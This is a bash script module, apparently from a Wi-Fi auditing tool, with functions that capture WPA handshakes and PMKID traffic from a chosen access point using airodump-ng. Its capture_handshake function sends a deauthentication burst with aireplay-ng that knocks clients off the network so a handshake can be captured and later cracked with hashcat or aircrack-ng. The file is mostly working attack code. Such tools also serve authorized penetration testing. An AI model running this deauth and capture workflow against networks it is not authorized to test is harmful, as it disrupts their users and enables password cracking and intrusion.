#!/usr/bin/env bash

source "$(dirname "${BASH_SOURCE[0]}")/utils.sh"

handshake_capture_name() {
    local ssid=$1
    local safe_name=${ssid// /_}
    safe_name=${safe_name//\//_}
    safe_name=${safe_name//[^[:alnum:]_.-]/_}
    if [ -z "$safe_name" ] || [ "$safe_name" = "<hidden>" ]; then
        safe_name="hidden_network"
    fi
    printf '%s\n' "$CAPTURE_DIR/${safe_name}_handshake"
}

verify_handshake() {
    local cap_file=$1
    if [ ! -f "$cap_file" ]; then
        log_error "Capture file $cap_file not found."
        return 1
    fi

    if aircrack-ng "$cap_file" 2>/dev/null | grep -Eiq '(1 handshake|handshake)'; then
        log_success "Handshake verification succeeded for $cap_file"
        return 0
    fi

    log_error "No valid handshake detected in $cap_file"
    return 1
}

capture_handshake() {
    local interface=$1
    local bssid=$2
    local channel=$3
    local ssid=$4
    local output_prefix

    RETURN_TO_MENU=0
    output_prefix=$(handshake_capture_name "$ssid")

    log_info "Target: $ssid ($bssid) | Channel: $channel"
    log_info "Starting focused capture. Press Ctrl+C once you believe a handshake has been captured."

    airodump-ng --bssid "$bssid" --channel "$channel" --write "$output_prefix" "$interface" &
    local capture_pid=$!
    register_pid "$capture_pid"

    sleep 2
    log_warn "Sending deauthentication burst to encourage a re-association..."
    aireplay-ng --deauth 10 -a "$bssid" "$interface" >/dev/null 2>&1 || \
        log_warn "Deauthentication failed or was rejected. Continuing capture anyway."

    wait "$capture_pid" 2>/dev/null
    remove_pid "$capture_pid"
    RETURN_TO_MENU=0

    local cap_file="${output_prefix}-01.cap"
    verify_handshake "$cap_file"
}

capture_pmkid() {
    local interface=$1
    local bssid=$2
    local channel=$3
    local ssid=$4

    if ! command -v hcxpcapngtool >/dev/null 2>&1; then
        log_error "PMKID workflows require hcxtools (hcxpcapngtool)."
        return 1
    fi

    local output_prefix
    output_prefix=$(handshake_capture_name "${ssid}_pmkid")
    log_info "Starting passive PMKID-oriented capture for $ssid on channel $channel"
    log_warn "This workflow only captures packets. PMKID extraction and validation must be done manually."

    airodump-ng --bssid "$bssid" --channel "$channel" --write "$output_prefix" --output-format cap "$interface" &
    local capture_pid=$!
    register_pid "$capture_pid"

    sleep 60
    kill "$capture_pid" 2>/dev/null
    wait "$capture_pid" 2>/dev/null
    remove_pid "$capture_pid"

    log_info "Capture finished. Review ${output_prefix}-01.cap with hcxtools or hashcat."
}
